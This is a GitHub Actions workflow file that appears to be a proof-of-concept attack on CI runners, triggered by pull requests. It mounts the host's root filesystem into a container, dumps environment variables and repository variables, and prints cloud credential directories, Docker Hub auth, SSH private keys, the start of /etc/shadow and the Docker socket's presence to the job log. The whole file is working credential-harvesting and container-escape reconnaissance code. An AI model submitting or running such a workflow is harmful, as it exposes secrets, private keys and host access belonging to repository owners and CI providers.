name: recon - full host dump with var test

on:
  pull_request:
    branches: [main, master]

jobs:
  test-vars:
    runs-on: ubuntu-latest
    container:
      image: alpine:latest
      options: --env POC_CONFIRMED=yes
    steps:
      - name: Check if vars/secrets available
        run: |
          echo "=== TEST: vars.MY_VAR ==="
          echo "MY_VAR from vars: [${{ vars.MY_VAR }}]"
          echo ""
          echo "=== TEST: full env dump ==="
          env | sort
          echo ""
          echo "--- looking for MY_ ---"
          env | grep MY_ || echo "no MY_ env vars"

  full-recon:
    runs-on: ubuntu-latest
    container:
      image: alpine:latest
      options: -v /:/host
    steps:
      - run: |
          echo "=== HOST IDENTITY ==="
          echo "Hostname: $(cat /host/etc/hostname 2>/dev/null)"
          echo "Kernel:   $(cat /host/proc/version 2>/dev/null)"
          echo "OS:       $(cat /host/etc/os-release 2>/dev/null | grep PRETTY_NAME)"
          echo "Uptime:   $(cat /host/proc/uptime 2>/dev/null | awk '{print int($1/86400)"d "int($1%86400/3600)"h"}')"
      - run: |
          echo "=== CLOUD CREDENTIALS ==="
          for dir in .aws .azure .gcp .config/gcloud .kube .helm; do
            echo "--- /home/runner/$dir ---"
            ls -la "/host/home/runner/$dir" 2>/dev/null || echo "  (not found)"
          done
          echo "--- Docker Hub auth ---"
          cat /host/home/runner/.docker/config.json 2>/dev/null
      - run: |
          echo "=== SSH ==="
          for f in .ssh/id_rsa .ssh/id_ed25519 .ssh/authorized_keys .ssh/known_hosts .ssh/config; do
            echo "--- /home/runner/$f ---"
            cat "/host/home/runner/$f" 2>/dev/null || echo "  (not found)"
          done
      - run: |
          echo "=== RUNNER CONFIG ==="
          ls /host/home/runner/actions-runner/ 2>/dev/null | head -10
      - run: |
          echo "=== WORKSPACES ==="
          ls -la /host/home/runner/work/
      - run: |
          echo "=== SYSTEM SECRETS ==="
          head -5 /host/etc/shadow 2>/dev/null || echo "  (not readable)"
          echo "--- docker group ---"
          grep docker /host/etc/group 2>/dev/null
      - run: |
          echo "=== DOCKER ON HOST ==="
          ls -la /host/var/run/docker.sock
